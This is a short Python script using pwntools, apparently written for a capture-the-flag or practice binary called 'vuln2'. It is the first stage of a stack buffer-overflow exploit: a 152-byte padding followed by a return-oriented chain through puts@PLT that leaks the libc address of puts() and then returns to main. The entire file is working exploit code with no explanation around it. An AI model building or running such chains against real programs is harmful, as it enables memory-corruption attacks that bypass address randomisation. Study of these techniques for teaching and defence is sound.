from pwn import *
r = process('vuln2')

main_address = 0x080487dd
puts_glibc_address = 0x0804a028
puts_plt_address = 0x08048540
pop_edi_ret_address = 0x0804895a

payload = 'A'*152+ p32(pop_edi_ret_address) + p32(puts_glibc_address) + p32(puts_plt_address) + p32(main_address)

r.recv()
r.sendline(payload)

leaked_output = r.recvline()
leaked_output = leaked_output[:-1]

print('leaked puts() address', leaked_output)
r.sendline('a')
l = r.recvline()
print(l)
